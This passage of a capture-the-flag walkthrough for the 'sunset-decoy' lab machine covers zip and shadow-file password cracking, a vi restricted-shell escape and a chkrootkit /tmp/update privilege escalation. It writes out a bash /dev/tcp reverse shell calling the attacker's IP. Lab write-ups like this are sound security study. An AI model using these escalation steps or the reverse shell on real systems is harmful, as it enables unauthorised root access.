</code></pre></div><p>Only port <code>80</code> and <code>22</code> appeared to be exposed. I took a look at what was being served by port <code>80</code> and found a single zip file named &ldquo;save.zip&rdquo;. I downloaded the file and attempted to extract the contents but found that it required a password.</p>
<p><img src="/static/sunset-decoy/1.png" alt=""></p>
<p>I used fcrackzip to crack the zip password: &ldquo;manuel&rdquo;.</p>
<p><img src="/static/sunset-decoy/2.png" alt=""></p>
<p><img src="/static/sunset-decoy/3.png" alt=""></p>
<p>Inside the zip file was a backup from (I guessed) the box I was trying to gain access to. I could see the passwd file and the shadow file, which was all I needed to attempt to crack the user&rsquo;s passwords.</p>
<p><img src="/static/sunset-decoy/4.png" alt=""></p>
<p><img src="/static/sunset-decoy/5.png" alt=""></p>
<p>The password for user &ldquo;296640a3b825115a47b68fc44501c828&rdquo; was &ldquo;server&rdquo;. I logged into the machine using <code>ssh</code> and started looking around. Looking around was a little difficult to do at this point because I was in a restricted shell, something I needed to break out of if I was going to get anywhere.</p>
<p><img src="/static/sunset-decoy/6.png" alt=""></p>
<p>I found an interesting looking executable named &ldquo;honeypot.decoy&rdquo;. I ran <code>honeypot.decoy</code> to see what it did, and I also copied <code>honeypot.decoy</code> back to my machine for some analysis in Ghidra.</p>
<p><img src="/static/sunset-decoy/8.png" alt=""></p>
<p><img src="/static/sunset-decoy/7.png" alt=""></p>
<p>Ghidra showed what each option <code>honeypot.decoy</code> was executing under the hood. The first interesting option was option 7 as I could potentially use <code>vi</code> to break out of the restricted shell. The second interesting option was option 5. The output of this option suggested that an AV scan was going to start in &ldquo;a minute or less&rdquo; but the command that was ran as part of this option just placed a file in <code>/dev/shm</code> named <code>STTY5246</code>. This suggested to me that there was a cronjob running every minute that looked for this particular file and would action something based on its presence.</p>
<p>The first thing to do was to break out of the restricted shell using <code>vi</code>. I ran <code>honeypot.decoy</code>, entered option 7 which placed me into a <code>vi</code> editor. I ran the following commands in <code>vi</code> to gain access to a <code>sh</code> session:</p>
<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">:set shell=/bin/sh
:shell
</code></pre></div><p>Once I had an unrestricted shell I updated the PATH as the PATH was set to: <code>/home/296640a3b825115a47b68fc44501c828</code> which was a bit limited.</p>
<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:$PATH
</code></pre></div><p>Now I could do some interesting things:</p>
<p><img src="/static/sunset-decoy/9.png" alt=""></p>
<p>Before I got started looking into option 5 in <code>honeypot.decoy</code> I looked around the user&rsquo;s home directory a bit more and came across some log files for a program named &ldquo;pspy&rdquo;. I did some research and found out that pspy was a tool for showing processes running on the machine without the need for root permissions.</p>
<p><img src="/static/sunset-decoy/10.png" alt=""></p>
<p>I downloaded a copy of <a href="https://github.com/DominicBreuker/pspy">pspy</a> for myself and copied it onto the machine using <code>scp</code> and ran it, hoping it would give me some more insight into what that presumed cronjob (option 5) is doing.</p>
<p>In one tab I selected option 5 from <code>honeypot.decoy</code> and in another tab I had pspy running on the box. Within 30 seconds I could see a flood of processes appearing from something called <code>chkrootkit</code>, executed by root.</p>
<p><img src="/static/sunset-decoy/11.png" alt=""></p>
<p><img src="/static/sunset-decoy/12.png" alt=""></p>
<p>Sure enough, the existence of &ldquo;STTY5246&rdquo; in <code>/dev/shm</code> was causing something, somewhere, to execute <code>chkrootkit</code>.</p>
<p>I looked around for some more information on <code>chkrootkit</code> and came across <a href="https://www.exploit-db.com/exploits/33899">an exploit</a> for the exact version of <code>chkrootkit</code> the box was running:</p>
<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">- Put an executable file named &#39;update&#39; with non-root owner in /tmp (not
mounted noexec, obviously)
- Run chkrootkit (as uid 0)

Result: The file /tmp/update will be executed as root, thus effectively
rooting your box, if malicious content is placed inside the file.
</code></pre></div><p>I placed a reverse shell command into <code>/tmp/update</code> and marked the file as executable, as per the exploit instructions:</p>
<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#579">#!/bin/bash
</span><span style="color:#579"></span>bash -i &gt;&amp; /dev/tcp/192.168.1.199/9000 0&gt;&amp;<span style="color:#60e;font-weight:bold">1</span>
</code></pre></div><p>I also set up a listener on my machine using <code>nc</code>. A few seconds later the <code>update</code> was executed and I had remote root access:</p>

<p><img src="/static/sunset-decoy/14.png" alt=""></p>
<h3 id="final-thoughts">Final thoughts</h3>
<p>This was a fun little box to root. I was left scratching my head a few times but I managed to get there in the end with a bit of research and &ldquo;out of the box&rdquo; thinking. Thanks Felipe!</p>
